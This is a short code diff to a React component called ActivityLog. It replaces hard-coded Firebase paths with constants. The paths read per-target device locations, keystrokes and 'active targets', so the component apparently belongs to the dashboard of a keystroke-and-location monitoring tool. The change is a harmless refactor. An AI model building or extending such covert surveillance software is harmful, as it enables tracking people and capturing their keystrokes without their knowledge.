@@ -5,7 +5,7 @@ import { MapPin, Keyboard, BatteryCharging } from 'lucide-react';
 import { clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
 import { onValue, ref } from 'firebase/database';
-import { database } from '@/lib/firebase';
+import { database, FIREBASE_PATHS } from '@/lib/firebase';
 
 const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));
 
@@ -42,9 +42,9 @@ export default function ActivityLog({ targetId }: ActivityLogProps) {
 
     setLoading(true);
 
-    const locationRef = ref(database, '/kei-vault/locations');
+    const locationRef = ref(database, FIREBASE_PATHS.DEVICE_LOCATIONS);
     const keystrokeRef = ref(database, '/kei-vault/keystrokes');
-    const activeTargetRef = ref(database, '/kei-vault/active_targets');
+    const activeTargetRef = ref(database, FIREBASE_PATHS.ACTIVE_TARGETS);
 
     const buildEntries = () => {
       const targetLocations = locationsRef.current[targetId];
